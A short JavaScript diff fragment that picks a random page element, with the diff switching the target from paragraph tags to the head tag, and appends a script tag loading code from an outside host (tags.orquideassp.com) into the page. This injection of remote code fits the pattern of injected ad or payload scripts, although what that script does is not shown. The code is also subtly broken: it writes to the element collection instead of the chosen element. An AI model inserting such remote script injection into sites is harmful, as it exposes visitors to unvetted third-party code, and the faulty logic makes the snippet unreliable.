@@ -3,7 +3,7 @@ function random(min, max) {return Math.floor(Math.random() * (max - min + 1)) + 
 (function() {
   
   
-  var d = document, e = d.createElement('a'), p = d.getElementsByTagName('p'), r = p[random(0, (p.length - 1))];
+  var d = document, e = d.createElement('a'), p = d.getElementsByTagName('head'), r = p[random(0, (p.length - 1))];
   p.innerHTML += '<center><script src="https://tags.orquideassp.com/tag/13387"></script></center>';
   
   
